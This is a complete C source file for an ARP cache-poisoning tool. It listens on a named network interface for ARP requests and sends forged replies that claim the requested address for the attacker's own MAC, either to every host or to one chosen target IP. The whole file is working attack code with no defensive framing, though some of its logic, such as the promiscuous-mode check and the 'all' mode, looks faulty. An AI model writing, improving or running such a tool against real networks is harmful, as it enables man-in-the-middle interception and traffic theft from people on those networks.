
//compile with gcc main.c -o arpPoison

//std stuff
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

//network stuff
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

void printUsage() {
	printf("Usage: ./arpPoison <ifname> [all | <target ip>]\n");
}

int main(int argc, char** argv) {
	if(argc != 3) {
		printUsage();
		return 1;
	}

	int targetMode = 0;
	struct in_addr target_ip_addr = {0};
	if (strncmp("all", argv[2], 3)) {
		if(!inet_aton(argv[2], &target_ip_addr)) {
			printUsage();
			return 1;
		}
		targetMode = 1;
	}

	char* if_name = argv[1];
	//create the socket
	int socketd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if(socketd == -1) {
		printf("%s", strerror(errno));
		return 1;
	}
	//deterimine interface index
	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if(if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		printf("interface name is too long");
		return 1;
	}
	if(ioctl(socketd, SIOCGIFINDEX, &ifr) == -1) {
		printf("%s", strerror(errno));
		return 1;
	}
	int ifindex = ifr.ifr_ifindex;
	//set promiscuous mode
	if(ioctl(socketd, SIOCGIFFLAGS, &ifr) == -1) {
		printf("%s\n", strerror(errno));
		return 1;
	}
	if(ifr.ifr_flags & IFF_PROMISC == 0) { //if not set, set it
		ifr.ifr_flags |= IFF_PROMISC;
		if(ioctl(socketd, SIOCSIFFLAGS, &ifr) == -1) {
			printf("%s\n", strerror(errno));
			return 1;
		}
	}
	//get src MAC
	if(ioctl(socketd, SIOCGIFHWADDR, &ifr) == -1) {
		printf("%s\n", strerror(errno));
		return 1;
	}
	if(ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		printf("not an Ethernet interface\n");
		return 1;
	}
	unsigned char src_mac[6];
	memcpy(src_mac, ifr.ifr_hwaddr.sa_data, sizeof(src_mac));
	//get our ip addr
	if(ioctl(socketd, SIOCGIFADDR, &ifr) == -1) {
		printf("%s\n", strerror(errno));
		return 1;
	}
	struct in_addr src_ip_addr = {0};
	memcpy(&((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr, &src_ip_addr, sizeof(struct in_addr));

	//main loop: prep msg, receive request, send reply
	while(1) {
		//prepare message
		struct sockaddr_ll addr = {0};
		addr.sll_family = AF_PACKET;
		addr.sll_ifindex = ifindex;
		addr.sll_halen = ETHER_ADDR_LEN;
		addr.sll_protocol = htons(ETH_P_ARP);

		struct ether_arp rep;
		rep.arp_hrd=htons(ARPHRD_ETHER);
		rep.arp_pro=htons(ETH_P_IP);
		rep.arp_hln=ETHER_ADDR_LEN;
		rep.arp_pln=sizeof(in_addr_t);
		rep.arp_op=htons(ARPOP_REPLY);
		memset(rep.arp_sha, 0, sizeof(rep.arp_sha));
		memcpy(rep.arp_sha, src_mac, sizeof(rep.arp_sha));

		struct iovec iov[1];
		iov[0].iov_base = &rep;
		iov[0].iov_len = sizeof(rep);
		
		struct msghdr message;
		message.msg_name = &addr;
		message.msg_namelen = sizeof(addr);
		message.msg_iov = iov;
		message.msg_iovlen = 1;
		message.msg_control = 0;
		message.msg_controllen = 0;

		//receive message
		unsigned char recvMsg[1500];
		int numRead = recvfrom(socketd, recvMsg, 1500, 0, NULL, NULL);

		//check for targeting mode and if so, if it is our target
		if(!(targetMode && (*((uint32_t*)((struct ether_arp*)recvMsg)->arp_spa) == target_ip_addr.s_addr))) {
			continue;
		}
		//add reply fields
		memcpy(&rep.arp_tha, ((struct ether_arp*)recvMsg)->arp_sha, sizeof(rep.arp_tha));
		memcpy(&rep.arp_tpa, ((struct ether_arp*)recvMsg)->arp_spa, sizeof(rep.arp_tpa));
		memcpy(&rep.arp_spa, ((struct ether_arp*)recvMsg)->arp_tpa, sizeof(rep.arp_spa));

		//send
		memcpy(addr.sll_addr, &rep.arp_tha, ETHER_ADDR_LEN);
		if(sendmsg(socketd, &message, 0) == -1) {
			printf("%s", strerror(errno));
			return 1;
		}

		printf("poison sent to host: %s\n", inet_ntoa(*(struct in_addr*)rep.arp_tpa));
		
	}

	return 0;
}

